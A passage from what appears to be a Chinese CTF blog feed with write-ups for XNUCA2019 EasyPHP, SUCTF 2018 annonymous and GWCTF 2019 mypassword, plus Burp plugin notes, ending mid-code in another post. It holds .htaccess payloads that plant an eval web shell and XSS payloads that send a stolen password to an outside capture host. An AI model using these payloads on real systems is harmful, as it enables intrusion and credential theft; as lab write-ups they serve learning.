32767</strong>：2767是所有常量加起来的值</p><p>此时我们访问index.php就会触发error，将shell写入/tmp/fl3g.php中</p><pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20include_path%20%22%2Ftmp%2Fxx%2F%2BADw%3Fphp%20die(eval(%24_GET%5B2%5D))%2BADs%20%2BAF8AXw-halt%2BAF8-compiler()%2BADs%22%0Aphp_value%20error_reporting%2032767%0Aphp_value%20error_log%20%2Ftmp%2Ffl3g.php%0A%23%20%5C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload打入后，访问界面，这里按理来说应该是触发error了，但是，将报错结果写入<code>/tmp/fl3g.php</code></p><p>再写入个.htaccess文件</p><pre class="line-numbers language-none"><code class="language-none">php_value include_path &quot;&#x2F;tmp&quot;php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;# \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>将编码设置转为UTF-7,这样shell就能够被顺利的解析出来了。</p><pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20include_path%20%22%2Ftmp%22%0Aphp_value%20zend.multibyte%201%0Aphp_value%20zend.script_encoding%20%22UTF-7%22%0A%23%20%5C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意，在这里直接访问<code>/?2=phpinfo();</code>,payload里也是<code>die()</code>，目的就是为了不让代码执行到删除文件那里！！！在这里浪费了两个小时才意识到！！！！</p><h3 id="非预期解1"><a href="#非预期解1" class="headerlink" title="非预期解1"></a>非预期解1</h3><p>设置pcre的一些选项可以导致文件名判断失效，从而直接写入<code>fl3g.php</code></p><p>大概就是<code>preg_match()</code>函数在进行正则回溯的时候(比如贪婪匹配)超过100000次后会直接返回false，在这里就把这个次数设为0，导致这个函数直接坏掉。</p><pre class="line-numbers language-none"><code class="language-none">php_value pcre.backtrack_limit 0php_value pcre.jit 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>令filename为：</p><pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>content就能绕过stristr</p><h3 id="非预期解2"><a href="#非预期解2" class="headerlink" title="非预期解2"></a>非预期解2</h3><blockquote><p>注意:apache2.4.x不支持php_value</p></blockquote><p>换行符是<code>\n</code>,加了个<code>\</code>就变成<code>\\n</code>,就不是换行符了</p><p>就被解析成这样：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XNUCA2019Qualifier-EasyPHP/image-20210825233858546.png"></p><pre class="line-numbers language-none"><code class="language-none">php_value auto_prepend_fi\le &quot;.htaccess&quot;# &lt;?php phpinfo();?&gt;\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># %23 是# 的url编码，防止python把自己注释了</span><span class="token comment"># \\ ， 两个\\上传上去就是 一个 \</span>content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''php_value auto_prepend_fi\\le ".htaccess"%23&lt;?php eval($_POST[cmd]);?>\\'''</span>url <span class="token operator">=</span> <span class="token string">"http://203dd3ff-f703-4233-b159-93832d5b93b3.node4.buuoj.cn:81/?filename=.htaccess&amp;content=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>这篇写的很详细：</p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/115740087">https://blog.csdn.net/Zero_Adam/article/details/115740087</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[SUCTF 2018]annonymous</title>
      <link href="/p/1412980291.html"/>
      <url>/p/1412980291.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[create_function]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$MY</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"die(`cat flag.php`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function SUCTF_<span class="token interpolation"><span class="token variable">$hash</span></span>()&#123;"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"global \$MY;"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"\$MY();"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func_name"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><code>create_function()</code>用法见<a href="https://syunaht.com/p/3645611024.html#toc-heading-10">刷题笔记:[BJDCTF2020]EzPHP</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$lambda</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'return 1;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$lambda</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注意没加括号，会打印<code>%00lambda_%d</code>这样形式的字符串，也就是匿名函数的函数名，会随着刷新不断增大。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-annonymous/image-20210825191722768.png"></p><blockquote><p><code>%d</code>是持续递增的，这里的<code>%d</code>会一直递增到最大长度直到结束，通过大量的请求来迫使<code>Pre-fork</code>模式启动Apache启动新的线程，这样这里的<code>%d</code>会刷新为1</p></blockquote><pre class="line-numbers language-none"><code class="language-none">import requestsi &#x3D; 0while True:    r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;471d0bad-6115-4107-a4ab-33cd2cb83b26.node4.buuoj.cn:81&#x2F;?func_name&#x3D;%00lambda_1&#39;)    if &#39;flag&#39; in r.text:        print(r.text)        break    i +&#x3D; 1    print(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GWCTF 2019]mypassword</title>
      <link href="/p/2970831002.html"/>
      <url>/p/2970831002.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210824204245050.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>login.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>cookie <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> cookies <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cookies<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> arr <span class="token operator">=</span> cookies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> key <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>cookie<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210824211547043.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210824213535253.png"></p><p>有替换，但注意，这里用的是非递归思想，也就是说是黑名单里的单个元素进行循环替换，然后再进行下一个。这种情况就可以双写绕过。</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&lt;scriphostt&gt;alert(1)&lt;&#x2F;scriphostt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210824220745862.png"></p><p>感觉就应该是xss题目了。</p><p>加上login.js里的内容，大致就是读取cookies。</p><p>抄抄wp，利用<a href="http://http.requestbin.buuoj.cn/%E8%8E%B7%E5%8F%96%E4%B8%8B%E8%AF%B7%E6%B1%82">http://http.requestbin.buuoj.cn/获取下请求</a></p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;&lt;script src&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt;var psw &#x3D; document.getElementsByName(&quot;password&quot;)[0].value;document.location&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1ihbkir1&#x2F;?psw&#x3D;&quot;+psw;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加个cookie绕过替换</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&lt;incookieput type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;incookieput type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;&lt;scrcookieipt scookierc&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;scrcookieipt&gt;&lt;scrcookieipt&gt;var psw &#x3D; docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;docucookiement.locacookietion&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1ihbkir1&#x2F;?psw&#x3D;&quot;+psw;&lt;&#x2F;scrcookieipt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>等了很久，还是没触发我的xss，无语了。</p><p>2021年9月12日12:28:43</p><p>靶机可连外网，直接用<a href="https://beeceptor.com/">beeceptor</a>吧</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&lt;incookieput type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;incookieput type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;&lt;scrcookieipt scookierc&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;scrcookieipt&gt;&lt;scrcookieipt&gt;var psw &#x3D; docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;docucookiement.locacookietion&#x3D;&quot;https:&#x2F;&#x2F;ad456g45asd.free.beeceptor.com&#x2F;?psw&#x3D;&quot;+psw;&lt;&#x2F;scrcookieipt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210912123143238.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp插件-Unicode Auto Decode</title>
      <link href="/p/1323803757.html"/>
      <url>/p/1323803757.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/">原贴链接</a>，在此感谢这位师傅极其详细的注释。</p><p>这插件挺好使，遇到unicode编码省的转来转去，方便看结果。但有个问题就是它只会转第一个unicode字符串，后面的就不转了，于是拿来改了改。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><a href="https://github.com/KagamigawaMeguri/burp-UnicodeAutoDecode">https://github.com/KagamigawaMeguri/burp-UnicodeAutoDecode</a></p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/../images/Burp%E6%8F%92%E4%BB%B6-Unicode-Auto-Decode/image-20210824001051562.png"></p><p><img src="/../images/Burp%E6%8F%92%E4%BB%B6-Unicode-Auto-Decode/image-20210824001101974.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp插件-Copy as requests</title>
      <link href="/p/3960013565.html"/>
      <url>/p/3960013565.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这插件是今年五月份才遇到的，结果是这几个月以来使用最频繁的插件，很适合我，有了它就不需要burp抓包，一个一个复制数据或者用扔到POSTMAN里生成python代码。可以一键生成，爽嗷！</p><p>但其中也有些不太满意的地方，于是今天琢磨了一下，改了改，把它变成我想要的形状。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>源码和jar包都放github了。</p><p>原作者是<a href="https://github.com/silentsignal">@silentsignal</a></p><p><a href="https://github.com/KagamigawaMeguri/burp-requests">https://github.com/KagamigawaMeguri/burp-requests</a></p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><ol><li><p>把mjson从1.4更新到了2.0</p></li><li><p>因为之前做题正好测试了下requests模块session对于cookies的管理问题，<a href="https://syunaht.com/p/2768731149.html#toc-heading-3">链接在这</a>。于是改成在session连接使用<code>cookies.update()</code></p></li><li><p>复制一个连接的话去掉了burp*_的前缀，复制多个则保留。其中有个问题就是复制多个不同url不会重新创建session，但不打算改，因为就不应该一次性选择多个不同域名然后复制，这没有意义。</p></li><li><p>源码使用gradle重构(没用过ant)。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp插件开发笔记</title>
      <link href="/p/1947914890.html"/>
      <url>/p/1947914890.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想把一些好用的插件改成自己想要的形状，于是尝试一下，当做拓展学习了。</p><h2 id="JAR打包"><a href="#JAR打包" class="headerlink" title="JAR打包"></a>JAR打包</h2><p>奇怪的是，照着网上教程在<em>Project Structure</em>里的<em>Artifacts</em>处尝试打包jar，但OK怎么都点不下去，明明代码是一样的，难道是用了gradle的关系？</p><p>还有这里有一篇文章救了我</p><p><a href="https://www.secpulse.com/archives/124593.html">从头开发一个BurpSuite数据收集插件</a></p><p>在<strong>build.gradle</strong>处添加gradle插件<a href="https://plugins.gradle.org/plugin/com.github.johnrengelman.shadow">com.github.johnrengelman.shadow</a></p><pre class="line-numbers language-none"><code class="language-none">plugins &#123;    id &quot;com.github.johnrengelman.shadow&quot; version &quot;7.0.0&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在右侧gradle栏选<code>shadowJar</code>即可在<strong>build/libs</strong>目录下生成jar包</p><p><img src="/../images/Burp%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/image-20210823164635997.png"></p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[2020 新春红包题]1</title>
      <link href="/p/3729230019.html"/>
      <url>/p/3729230019.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hint1: /?src=1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token string single-quoted-string">'path'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'basename'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'size'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mimetype'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'visibility'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'timestamp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'type'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCacheKey</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 使缓存文件名随机</span>        <span class="token variable">$cache_filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cache_filename</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$cache_filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 